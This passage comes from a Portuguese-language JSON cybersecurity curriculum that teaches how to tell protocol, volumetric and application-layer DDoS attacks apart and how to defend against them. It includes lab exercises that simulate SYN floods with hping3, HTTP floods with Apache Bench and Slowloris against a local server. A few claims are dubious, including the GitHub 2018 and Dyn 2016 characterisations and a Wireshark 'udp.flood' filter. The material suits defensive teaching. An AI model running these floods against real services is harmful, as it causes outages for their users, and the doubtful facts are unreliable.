                                "Programação: Uso de Scapy/hping3 para packet crafting.",
                                "Ética em TI: Impacto de DoS em sociedade e leis como CFAA.",
                                "Matemática: Análise de taxas de flood (λ pacotes/seg)."
                              ],
                              "realWorldApplication": "Esses ataques clássicos informam defesas modernas em firewalls (e.g., AWS Shield contra SYN floods) e pentests; analistas SOC usam Wireshark para detectar padrões semelhantes em incidentes DDoS atuais, prevenindo downtime em bancos e e-commerces."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.5.2.2.3",
                            "name": "Diferenciar de ataques volumétricos",
                            "description": "Comparar com volumétricos destacando o foco em recursos computacionais versus banda, e mencionar defesas como SYN cookies ou rate limiting em firewalls.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Ataques DDoS Volumétricos",
                                  "subSteps": [
                                    "Defina ataques volumétricos como floods de tráfego massivo (ex: UDP, ICMP) visando saturar a banda de rede.",
                                    "Identifique características: alto volume de pacotes (Gbps/Tbps), origem distribuída de bots.",
                                    "Estude exemplos: DNS amplification, NTP reflection.",
                                    "Analise impacto: congestão de rede, downtime por exaustão de largura de banda.",
                                    "Registre métricas típicas: >10Gbps, foco em links de entrada."
                                  ],
                                  "verification": "Crie um diagrama simples comparando tráfego normal vs. volumétrico e explique para um par.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Cloudflare sobre DDoS volumétricos",
                                    "Ferramenta Wireshark para simular tráfego",
                                    "Vídeo introdutório no YouTube sobre floods UDP"
                                  ],
                                  "tips": "Use analogia de 'engarrafamento na estrada' para visualizar saturação de banda.",
                                  "learningObjective": "Dominar as bases de ataques volumétricos para contrastar com protocolos.",
                                  "commonMistakes": "Confundir com ataques de aplicação; lembre-se que volumétricos não exploram vulnerabilidades de software."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Ataques DDoS de Protocolo",
                                  "subSteps": [
                                    "Defina ataques de protocolo como exploits em handshakes TCP/UDP (ex: SYN flood, ACK flood).",
                                    "Descreva mecanismo: envio de pacotes incompletos para esgotar recursos do servidor (memória, CPU).",
                                    "Examine exemplos: SYN flood (meio-open connections), Ping of Death.",
                                    "Analise impacto: exaustão de half-open connections, overload de estado de sessão.",
                                    "Registre métricas: milhões de pacotes/segundo, mas baixo volume de banda."
                                  ],
                                  "verification": "Simule um SYN flood básico em ambiente lab (usando hping3) e observe uso de CPU/memória.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta hping3 ou Scapy",
                                    "VM com Linux para testes",
                                    "Artigo da Cisco sobre SYN floods"
                                  ],
                                  "tips": "Monitore com 'netstat' ou 'ss' para ver conexões half-open crescendo.",
                                  "learningObjective": "Entender o foco em recursos computacionais dos ataques de protocolo.",
                                  "commonMistakes": "Ignorar que eles usam pouca banda; teste com ferramentas para confirmar."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Chave",
                                  "subSteps": [
                                    "Compare alvos: volumétricos (banda/rede) vs. protocolo (CPU/memória/sessões).",
                                    "Contraste detecção: volumétricos por volume alto; protocolo por padrões de pacotes anômalos.",
                                    "Destaque métricas: banda vs. pacotes/segundo e conexões pendentes.",
                                    "Crie tabela de comparação: origem, impacto, detecção.",
                                    "Discuta por que confundir afeta defesas erradas."
                                  ],
                                  "verification": "Preencha e discuta uma tabela de comparação com um colega ou em fórum.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou papel para tabela",
                                    "Infográfico da Akamai sobre tipos DDoS"
                                  ],
                                  "tips": "Use mnemônico: 'Volume = Banda, Protocolo = Processador'.",
                                  "learningObjective": "Capacitar diferenciação precisa entre os dois tipos.",
                                  "commonMistakes": "Achar que ambos saturam banda; protocolo foca estado do servidor."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Defesas Específicas",
                                  "subSteps": [
                                    "Estude SYN cookies: autenticação stateless para SYN floods.",
                                    "Explore rate limiting: limites em firewalls para pacotes/sessão.",
                                    "Compare defesas: volumétricos precisam scrubbing centers; protocolo usa IDS/IPS.",
                                    "Teste configuração básica de rate limiting em iptables.",
                                    "Avalie eficácia: monitore redução de half-open connections."
                                  ],
                                  "verification": "Configure SYN cookies em uma VM e teste com flood simulado; verifique logs.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Guia Linux iptables",
                                    "VM com kernel suporte a SYN cookies",
                                    "Ferramenta para simulação de ataques"
                                  ],
                                  "tips": "Ative sysctl net.ipv4.tcp_syncookies=1 e teste incrementalmente.",
                                  "learningObjective": "Associar defesas corretas aos tipos de ataque.",
                                  "commonMistakes": "Aplicar scrubbing para protocolo; não resolve exaustão de CPU."
                                }
                              ],
                              "practicalExample": "Em um e-commerce durante Black Friday, um SYN flood (protocolo) esgota conexões do load balancer (milhões de SYNs falsos), enquanto um UDP flood (volumétrico) satura o ISP. Diferenciar permite ativar SYN cookies vs. upstream filtering.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças chave sem hesitação.",
                                "Identificar tipo de ataque em log de tráfego Wireshark.",
                                "Configurar defesa básica para protocolo em lab.",
                                "Preencher tabela de comparação com 90% acurácia.",
                                "Discutir impacto de confusão em cenário real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de alvos (banda vs. recursos): 0-5 pontos.",
                                "Compreensão de exemplos e mecanismos: 0-5 pontos.",
                                "Aplicação de defesas corretas: 0-5 pontos.",
                                "Uso de métricas para diferenciação: 0-5 pontos.",
                                "Clareza em explicação comparativa: 0-5 pontos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de protocolos TCP/UDP.",
                                "Sistemas Operacionais: Gerenciamento de recursos kernel.",
                                "Estatística: Interpretação de métricas de tráfego.",
                                "Programação: Scripts para simulação com Scapy/Python."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, diferenciar permite priorizar alertas: rate limiting para floods de protocolo em web servers, vs. BGP blackholing para volumétricos, evitando falsos positivos e downtime desnecessário."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.1.1",
                              "10.1.5.2.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.3",
                        "name": "Ataques DDoS de Camada de Aplicação",
                        "description": "Ataques direcionados à camada 7 (aplicação), que esgotam recursos específicos de aplicações web como CPU, memória ou banco de dados, simulando tráfego legítimo e sendo difíceis de filtrar.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.3.1",
                            "name": "Descrever o foco na camada de aplicação",
                            "description": "Explicar que esses ataques geram requisições HTTP/HTTPS válidas em alto número ou lentidão, consumindo threads de processamento sem saturar banda, como em floods de GET/POST.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Camada de Aplicação no Modelo OSI/TCP-IP",
                                  "subSteps": [
                                    "Estude o modelo OSI, focando na Camada 7 (Aplicação).",
                                    "Identifique protocolos comuns como HTTP, HTTPS, SMTP e FTP.",
                                    "Analise como a camada de aplicação processa dados de alto nível para o usuário final.",
                                    "Compare com camadas inferiores (ex: transporte e rede).",
                                    "Visualize diagramas do stack TCP/IP."
                                  ],
                                  "verification": "Desenhe um diagrama do modelo OSI destacando a Camada 7 e liste 3 protocolos associados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Diagramas OSI/TCP-IP (online ou PDF), documentação IETF sobre HTTP.",
                                  "tips": "Use mnemônicos como 'Please Do Not Throw Sausage Pizza Away' para lembrar as camadas OSI.",
                                  "learningObjective": "Entender o papel da Camada 7 na comunicação de rede.",
                                  "commonMistakes": "Confundir Camada 7 com Camada 4 (transporte); lembre que Aplicação lida com dados sem processar pacotes brutos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Características dos Ataques DDoS de Camada de Aplicação",
                                  "subSteps": [
                                    "Defina DDoS de Camada 7: requisições HTTP/HTTPS válidas em volume alto ou lentas.",
                                    "Explique o consumo de recursos: threads de processamento, CPU e memória no servidor web.",
                                    "Diferencie de saturação de banda (camadas 3/4).",
                                    "Estude métricas de impacto: tempo de resposta lento, erros 503.",
                                    "Analise por que são difíceis de detectar (tráfego legítimo)."
                                  ],
                                  "verification": "Escreva um parágrafo comparando impacto de DDoS L7 vs L4 em um servidor.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigos sobre DDoS (ex: OWASP, Cloudflare blog), Wireshark para capturas de tráfego.",
                                  "tips": "Pense em 'lento mas mortal': ataques L7 esgotam workers sem flood de bytes.",
                                  "learningObjective": "Reconhecer mecanismos de exaustão em servidores de aplicação.",
                                  "commonMistakes": "Assumir que todo tráfego alto é DDoS; foque em padrões de requisições válidas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Tipos Específicos de Ataques DDoS L7",
                                  "subSteps": [
                                    "Descreva HTTP GET Flood: alto volume de requests simples.",
                                    "Explique HTTP POST Flood: payloads grandes para consumir processamento.",
                                    "Estude Slowloris: conexões lentas mantendo threads ocupados.",
                                    "Analise R.U.D.Y. (R U Dead Yet?): POSTs lentos com dados trickle.",
                                    "Liste ferramentas de simulação: hping3, Apache Bench."
                                  ],
                                  "verification": "Liste 4 tipos de ataques L7 com uma frase descrevendo cada um.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Documentação OWASP DDoS, vídeos demonstrativos éticos (YouTube canais de cibersegurança).",
                                  "tips": "Teste em lab local: use 'ab -n 1000 -c 100 url' para simular GET flood.",
                                  "learningObjective": "Classificar e descrever variantes comuns de ataques de aplicação.",
                                  "commonMistakes": "Ignorar HTTPS; muitos ataques usam TLS para evasão."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Detecção e Diferenciação de Ataques L7",
                                  "subSteps": [
                                    "Compare com DDoS de camadas inferiores: L7 ignora filtros de banda.",
                                    "Identifique assinaturas: picos em requests/segundo, URLs específicas.",
                                    "Discuta mitigação básica: rate limiting, WAF, CDN.",
                                    "Avalie impactos reais: downtime em apps web.",
                                    "Pratique análise de logs de servidor web."
                                  ],
                                  "verification": "Crie uma tabela comparando DDoS L3/L4 vs L7 (3 colunas: foco, detecção, mitigação).",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Logs de Apache/Nginx de exemplo, ferramentas como Fail2Ban.",
                                  "tips": "Monitore métricas com tools como Prometheus para ver threads exauridos.",
                                  "learningObjective": "Diferenciar e contextualizar ataques L7 no ecossistema DDoS.",
                                  "commonMistakes": "Subestimar escalabilidade; bots IoT amplificam L7 facilmente."
                                }
                              ],
                              "practicalExample": "Configure um servidor web local com Apache (Docker: httpd image). Use Apache Bench ('ab -n 5000 -c 200 http://localhost/') para simular GET flood, monitore com 'top' ou 'htop' o aumento de threads/CPU, observando lentidão sem saturação de rede.",
                              "finalVerifications": [
                                "Explique em 100 palavras o foco da Camada de Aplicação em DDoS.",
                                "Liste 3 tipos de ataques L7 com exemplos.",
                                "Descreva como um HTTP flood consome recursos sem saturar banda.",
                                "Diferencie DDoS L7 de L4 em uma frase.",
                                "Identifique 2 ferramentas para simulação ética.",
                                "Analise um log de exemplo e aponte sinais de L7 DDoS."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: uso correto de termos como 'threads', 'requisições válidas' (30%).",
                                "Profundidade: inclusão de exemplos e comparações (25%).",
                                "Clareza: explicações concisas e estruturadas (20%).",
                                "Aplicação prática: menção a detecção/mitigação (15%).",
                                "Originalidade: análise própria, não copiada (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: compreensão de modelo OSI/TCP-IP.",
                                "Desenvolvimento Web: análise de requests HTTP/HTTPS.",
                                "Análise de Sistemas: monitoramento de performance (CPU/threads).",
                                "Ética e Direito: implicações legais de simulações de ataques.",
                                "Estatística: interpretação de métricas de tráfego."
                              ],
                              "realWorldApplication": "Durante o Cyber Monday, atacantes usam DDoS L7 contra e-commerces (ex: ataque ao Shopify em 2019), gerando milhares de requests legítimos para esgotar servidores, causando perdas de milhões em vendas e destacando a necessidade de WAFs como Akamai ou Cloudflare."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.3.2",
                            "name": "Exemplificar ataques comuns",
                            "description": "Apresentar Slowloris (mantém conexões HTTP abertas com dados parciais) e HTTP Flood (requisições dinâmicas intensivas), citando casos como o ataque ao GitHub em 2018 com 1.3 Tbps.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o mecanismo do ataque Slowloris",
                                  "subSteps": [
                                    "Pesquise a definição de Slowloris como um ataque DDoS de camada de aplicação que mantém conexões HTTP abertas com dados parciais.",
                                    "Analise como o atacante envia requisições HTTP parciais e headers incompletos para esgotar os slots de conexão do servidor.",
                                    "Estude o impacto: servidores web ficam sobrecarregados sem poder processar novas requisições legítimas.",
                                    "Identifique ferramentas comuns como o script Perl original de RSnake para simulação ética.",
                                    "Registre diferenças de ataques volumétricos tradicionais."
                                  ],
                                  "verification": "Crie um diagrama de fluxo mostrando o ciclo de uma conexão Slowloris e explique-o em voz alta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação oficial do Slowloris (GitHub RSnake), diagrama tools como Draw.io, navegador para pesquisa.",
                                  "tips": "Use analogia de 'fila de banco lotada por clientes que não avançam' para visualizar.",
                                  "learningObjective": "Compreender o funcionamento técnico do Slowloris e seu impacto em servidores HTTP.",
                                  "commonMistakes": "Confundir com ataques SYN flood (camada de transporte); foque na camada de aplicação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o ataque HTTP Flood",
                                  "subSteps": [
                                    "Defina HTTP Flood como inundações de requisições HTTP dinâmicas (GET/POST) que sobrecarregam processamento do servidor.",
                                    "Diferencie de floods estáticos: envolva scripts dinâmicos que geram payloads variáveis para burlar caches.",
                                    "Analise recursos consumidos: CPU/memória por processamento de lógica de aplicação.",
                                    "Liste ferramentas como Apache Benchmark (ab) ou LOIC para demonstrações controladas.",
                                    "Compare eficiência: baixo tráfego de rede, alto impacto computacional."
                                  ],
                                  "verification": "Escreva um parágrafo comparando HTTP Flood com Slowloris e valide com fonte confiável.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Artigos OWASP sobre HTTP Flood, ferramentas de benchmark como Apache ab, notas em editor de texto.",
                                  "tips": "Teste um HTTP Flood leve em servidor local próprio para observar métricas (use htop).",
                                  "learningObjective": "Dominar as características e mecanismos do HTTP Flood em ataques de camada 7.",
                                  "commonMistakes": "Ignorar distinção dinâmica vs. estática; sempre enfatize processamento de aplicação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o caso real do ataque ao GitHub em 2018",
                                  "subSteps": [
                                    "Pesquise o incidente: ataque DDoS de 1.3 Tbps usando memcached amplification, mas foque em elementos de camada 7 como HTTP floods.",
                                    "Identifique vetores: combinação de floods volumétricos e aplicação, durando 8 minutos.",
                                    "Extraia lições: GitHub mitigou com scrubbing centers e rate limiting.",
                                    "Colete métricas: pico de 1.3 Tbps, downtime mínimo graças a preparação.",
                                    "Crie timeline visual do ataque e resposta."
                                  ],
                                  "verification": "Resuma o caso em 5 bullet points com fontes citadas (ex: Cloudflare blog).",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Relatórios Cloudflare/GitHub 2018 DDoS, timeline tools como Canva, fontes como Krebs on Security.",
                                  "tips": "Busque vídeos de análise para visualização dinâmica do tráfego amplificado.",
                                  "learningObjective": "Aplicar conceitos de Slowloris/HTTP Flood a um caso histórico real.",
                                  "commonMistakes": "Focar só no volume; destaque componentes de camada de aplicação."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar exemplificação e síntese dos ataques",
                                  "subSteps": [
                                    "Crie exemplos visuais: diagramas para Slowloris e HTTP Flood.",
                                    "Prepare uma explicação oral de 2 minutos para cada ataque, incluindo o caso GitHub.",
                                    "Discuta mitigações comuns: timeouts, WAF, rate limiting.",
                                    "Simule em ambiente virtual: use Docker para servidor vulnerável e ferramentas éticas.",
                                    "Avalie autoexplicação gravando e revisando."
                                  ],
                                  "verification": "Apresente a um colega ou grave vídeo explicando os três elementos com clareza.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Docker para simulação, Draw.io/Lucidchart, gravador de tela (OBS Studio).",
                                  "tips": "Use cores diferentes em diagramas: azul para legítimo, vermelho para malicioso.",
                                  "learningObjective": "Capacitar-se a exemplificar ataques de forma clara e didática.",
                                  "commonMistakes": "Explicações vagas; inclua números concretos como '1.3 Tbps' e 'conexões parciais'."
                                }
                              ],
                              "practicalExample": "Em um laboratório local com Docker, configure um servidor Nginx. Use o script Slowloris para abrir 100 conexões parciais e observe via htop o esgotamento de workers. Em seguida, execute um HTTP Flood com Apache ab (10.000 req/s) e monitore CPU spike, replicando o overload visto no GitHub.",
                              "finalVerifications": [
                                "Explicar Slowloris sem erros em <2 minutos.",
                                "Descrever HTTP Flood diferenciando de floods estáticos.",
                                "Citar corretamente métricas e mitigações do GitHub 2018.",
                                "Desenhar diagramas precisos de ambos ataques.",
                                "Identificar 3 mitigações para cada tipo.",
                                "Comparar impactos em cenários reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nos mecanismos (80%+ correto).",
                                "Uso de exemplos concretos e caso GitHub.",
                                "Clareza na comunicação (diagramas/oral).",
                                "Inclusão de mitigações e diferenças chave.",
                                "Profundidade em subcomponentes (headers parciais, payloads dinâmicos).",
                                "Aplicação ética: ênfase em defesa, não ofensiva."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Camadas OSI/TCP-IP (foco em L7).",
                                "Programação: Scripts Python/Perl para simulações éticas.",
                                "História da Computação: Evolução de DDoS desde 2000s.",
                                "Ética e Direito: Leis sobre ciberataques (ex: CFAA)."
                              ],
                              "realWorldApplication": "Em equipes de SOC, esses conhecimentos permitem detectar anomalias como conexões longas (Slowloris) ou picos de req/s dinâmicos (HTTP Flood) via ferramentas como Splunk/ELK, configurando alertas para mitigar incidentes como o GitHub, protegendo serviços críticos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.3.1"
                            ]
                          },
                          {
                            "id": "10.1.5.2.3.3",
                            "name": "Discutir desafios de detecção",
                            "description": "Analisar por que são stealthy (tráfego parece legítimo), exigindo análise comportamental, WAFs ou machine learning para distinção de usuários reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a natureza stealthy dos ataques DDoS de camada de aplicação",
                                  "subSteps": [
                                    "Estude exemplos de requisições HTTP/HTTPS normais usadas em ataques (ex: GET/POST lentos).",
                                    "Analise como botnets geram tráfego que imita navegadores reais, incluindo headers e User-Agents.",
                                    "Identifique métricas de tráfego que se confundem com uso legítimo (baixa taxa, sessões longas).",
                                    "Compare com DDoS volumétricos para destacar diferenças na camadas de rede vs. aplicação.",
                                    "Registre razões principais: ofuscação, baixa volume e persistência."
                                  ],
                                  "verification": "Resuma em 3-5 pontos por que o tráfego parece legítimo e liste 2 exemplos reais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação OWASP sobre DDoS L7, Wireshark para capturas de pacotes, artigos sobre Slowloris.",
                                  "tips": "Use diagramas para visualizar tráfego legítimo vs. malicioso.",
                                  "learningObjective": "Explicar mecanismos que tornam ataques DDoS L7 indetectáveis por filtros básicos.",
                                  "commonMistakes": "Confundir com ataques de camada de rede; ignorar impacto de sessões persistentes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar limitações das técnicas de detecção tradicionais",
                                  "subSteps": [
                                    "Avalie signature-based detection: por que falha em tráfego mutável.",
                                    "Examine rate-limiting: vulnerabilidades a ataques lentos e distribuídos.",
                                    "Discuta IPS/IDS rule-based: falsos positivos em picos legítimos.",
                                    "Teste simulações simples de tráfego lento vs. bursts normais.",
                                    "Documente métricas como RPS (requests per second) que não distinguem."
                                  ],
                                  "verification": "Crie uma tabela comparando 3 técnicas tradicionais e suas falhas específicas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramentas como Apache Benchmark (ab), logs de servidores web, guias de configuração de mod_security.",
                                  "tips": "Simule em ambiente local para observar thresholds falhando.",
                                  "learningObjective": "Identificar por que regras estáticas são ineficazes contra DDoS adaptativos.",
                                  "commonMistakes": "Superestimar eficácia de firewalls de rede em camada 7; ignorar overhead de processamento."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar técnicas avançadas de detecção",
                                  "subSteps": [
                                    "Estude análise comportamental: padrões de mouse, tempo de sessão, sequências de requisições.",
                                    "Configure WAFs (ex: Cloudflare, ModSecurity): regras personalizadas para anomalias L7.",
                                    "Introduza machine learning: modelos de classificação para benigno vs. malicioso (features como entropy de headers).",
                                    "Compare supervised vs. unsupervised ML para detecção em tempo real.",
                                    "Implemente um exemplo básico com scikit-learn para classificação de logs."
                                  ],
                                  "verification": "Desenvolva um fluxograma de detecção integrando WAF + ML e explique 2 cenários.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Cloudflare docs, scikit-learn tutorials, datasets Kaggle de tráfego web, Jupyter Notebook.",
                                  "tips": "Comece com features simples como tamanho de payload antes de ML complexo.",
                                  "learningObjective": "Descrever como análise comportamental e ML distinguem usuários reais de bots.",
                                  "commonMistakes": "Subestimar latência de ML em produção; confundir correlação com causalidade em features."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Discutir trade-offs e desafios remanescentes",
                                  "subSteps": [
                                    "Analise falsos positivos/negativos em WAF/ML: impacto em UX legítima.",
                                    "Debata escalabilidade: custo computacional para grandes volumes.",
                                    "Explore evasões: atacantes usando ML para gerar tráfego realista.",
                                    "Considere integrações híbridas: behavioral + ML + human review.",
                                    "Proponha métricas de sucesso (ex: tempo de detecção < 5min, <1% falsos positivos)."
                                  ],
                                  "verification": "Escreva um relatório de 300 palavras sobre prós/contras de 3 técnicas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Case studies (ex: ataque GitHub 2018), papers IEEE sobre DDoS ML.",
                                  "tips": "Use matriz de decisão para comparar técnicas por custo vs. eficácia.",
                                  "learningObjective": "Avaliar limitações práticas e evoluções futuras na detecção de DDoS L7.",
                                  "commonMistakes": "Ignorar custos de treinamento ML; assumir detecção perfeita sem tuning contínuo."
                                }
                              ],
                              "practicalExample": "Em um ataque Slowloris a um site de e-commerce durante Black Friday, bots enviam requisições HTTP parciais a cada 10s, mantendo conexões abertas por horas, esgotando workers do servidor Apache sem exceder rate-limits. Detecção via WAF identifica padrões de ausência de User-Agent entropy e ML classifica baseado em falta de variação em sequências de cliques reais.",
                              "finalVerifications": [
                                "Explicar com precisão por que tráfego DDoS L7 parece legítimo.",
                                "Listar e comparar 3 limitações de detecção tradicional.",
                                "Descrever funcionamento de análise comportamental em WAFs.",
                                "Demonstrar exemplo simples de ML para classificação de tráfego.",
                                "Discutir 2 trade-offs reais (ex: falsos positivos vs. segurança)."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na explicação de stealthiness (cobertura de 4+ mecanismos).",
                                "Precisão técnica em técnicas avançadas (sem erros conceituais).",
                                "Criatividade em exemplos e diagramas personalizados.",
                                "Análise equilibrada de trade-offs com evidências.",
                                "Clareza e estrutura na comunicação de conceitos complexos."
                              ],
                              "crossCurricularConnections": [
                                "Estatística e Machine Learning: modelagem de features para classificação.",
                                "Programação: scripting para simulação e análise de logs (Python).",
                                "Ética em TI: impactos de falsos positivos em privacidade de usuários.",
                                "Redes de Computadores: protocolos HTTP e análise de pacotes."
                              ],
                              "realWorldApplication": "Em bancos como o JPMorgan, WAFs com ML detectam DDoS L7 durante picos de transações, prevenindo downtime que custaria milhões; governos usam análise comportamental para mitigar ataques estatais stealthy em portais públicos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.3.1",
                              "10.1.5.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.5.2.3.4",
                            "name": "Classificar dentro do espectro DDoS",
                            "description": "Integrar os três tipos em uma classificação geral (volumétrico L3/L4, protocolo L3/L4, aplicação L7), usando a pirâmide de DDoS para compreensão holística.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os Três Tipos Principais de Ataques DDoS",
                                  "subSteps": [
                                    "Liste e defina ataques volumétricos (L3/L4): floods UDP, ICMP, DNS amplification.",
                                    "Descreva ataques de protocolo (L3/L4): SYN flood, Ping of Death, exploits em protocolos como TCP/UDP.",
                                    "Explique ataques de aplicação (L7): HTTP floods, Slowloris, exploits em apps web.",
                                    "Compare características: volume de tráfego, alvo da camada, detecção típica.",
                                    "Identifique sobreposições entre tipos."
                                  ],
                                  "verification": "Crie uma tabela comparativa com pelo menos 3 exemplos por tipo e revise com um colega ou ferramenta de autoavaliação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação OSI, diagramas de ataques DDoS (ex: OWASP, Cloudflare Learning Center).",
                                  "tips": "Use mnemônicos: 'Volumétrico = Volume massivo', 'Protocolo = Protocolo quebrado', 'Aplicação = App sobrecarregada'.",
                                  "learningObjective": "Diferenciar precisamente os três tipos de DDoS por camada e mecanismo.",
                                  "commonMistakes": "Confundir L7 com L4 por tráfego HTTP; ignorar que L3/L4 podem se sobrepor."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender as Camadas OSI Relevantes para DDoS",
                                  "subSteps": [
                                    "Revise modelo OSI: foque em L3 (IP), L4 (TCP/UDP), L7 (Aplicação).",
                                    "Mapeie tipos DDoS: Volumétrico/Protocolo em L3/L4 (rede/transport), Aplicação em L7.",
                                    "Analise pacotes: identifique headers IP/TCP para L3/L4, payloads HTTP para L7.",
                                    "Estude ferramentas de captura: Wireshark filtros para floods (ex: udp.flood).",
                                    "Pratique decodificação de 2-3 pacotes de exemplo de cada camada."
                                  ],
                                  "verification": "Capture e analise um tráfego simulado em Wireshark, rotulando camadas corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Wireshark (gratuito), pcap files de ataques DDoS (ex: de repositórios públicos como Stratosphere IPS).",
                                  "tips": "Filtre por porta/protocolo: L4 SYN flood = tcp.flags.syn==1 && tcp.flags.ack==0.",
                                  "learningObjective": "Mapear ataques DDoS às camadas OSI com base em evidências de tráfego.",
                                  "commonMistakes": "Atribuir floods HTTP a L4 em vez de L7; ignorar encapsulamento de pacotes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir e Compreender a Pirâmide de DDoS",
                                  "subSteps": [
                                    "Desenhe a pirâmide: base = Volumétrico (mais comum, fácil), meio = Protocolo (sofisticado), topo = Aplicação (preciso, difícil).",
                                    "Explique progressão: sofisticação aumenta, volume diminui, evasão melhora.",
                                    "Identifique métricas: base (Gbps), meio (pps), topo (RPS).",
                                    "Relacione com vetores: amplificação na base, state exhaustion no meio, lógica app no topo.",
                                    "Crie diagrama pessoal da pirâmide com exemplos."
                                  ],
                                  "verification": "Desenhe e explique a pirâmide em um diagrama anotado, cobrindo todos os níveis.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Papel/imagem editor (Draw.io), recursos visuais (ex: Imperva DDoS Pyramid diagram).",
                                  "tips": "Pense em pirâmide invertida para impacto: base afeta todos, topo mira específico.",
                                  "learningObjective": "Visualizar a hierarquia de DDoS para classificação holística.",
                                  "commonMistakes": "Inverter níveis (achando L7 mais volumétrico); omitir sobreposições."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Tipos e Classificar no Espectro DDoS",
                                  "subSteps": [
                                    "Crie framework de classificação: 1) Camada alvo, 2) Tipo (vol/prot/app), 3) Posição na pirâmide, 4) Evidências.",
                                    "Classifique 5 ataques exemplo: NTP amp (vol L3), Slowloris (app L7), etc.",
                                    "Simule cenários: dado log/tráfego, aplique framework.",
                                    "Discuta ambiguidades: multi-vetorial (ex: vol + app).",
                                    "Teste com quiz: 10 itens mistos."
                                  ],
                                  "verification": "Classifique corretamente 90% em um quiz de 10 ataques variados.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Quiz online (Kahoot/Quizlet), logs de ataques (ex: de CTF challenges).",
                                  "tips": "Sempre pergunte: 'É volume puro? Explora protocolo? Ataca lógica app?'",
                                  "learningObjective": "Aplicar classificação integrada usando pirâmide para qualquer DDoS.",
                                  "commonMistakes": "Classificar por ferramenta usada, não mecanismo; ignorar multi-camadas."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar e Reforçar Classificação Holística",
                                  "subSteps": [
                                    "Analise caso real: ataque Dyn 2016 (app L7 mirado).",
                                    "Crie fluxograma pessoal para classificação rápida.",
                                    "Debata cenários: 'É vol ou prot?' com pares.",
                                    "Registre classificações em portfolio.",
                                    "Autoavalie gaps e revise."
                                  ],
                                  "verification": "Produza relatório de 3 casos reais classificados com justificativa.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Casos de estudo (ex: Krebs on Security, Akamai reports), fluxograma tool.",
                                  "tips": "Use heurística: Alto volume = base pirâmide; Baixo volume + app = topo.",
                                  "learningObjective": "Classificar DDoS de forma autônoma e holística em contextos reais.",
                                  "commonMistakes": "Sobrecarregar com detalhes irrelevantes; não considerar evolução de ataques."
                                }
                              ],
                              "practicalExample": "Dado um ataque com 10 Gbps de UDP aleatório para portas randômicas: Classifique como Volumétrico L3/L4 (base da pirâmide), evidência: alto volume sem exploits específicos, detectado por netflow thresholds.",
                              "finalVerifications": [
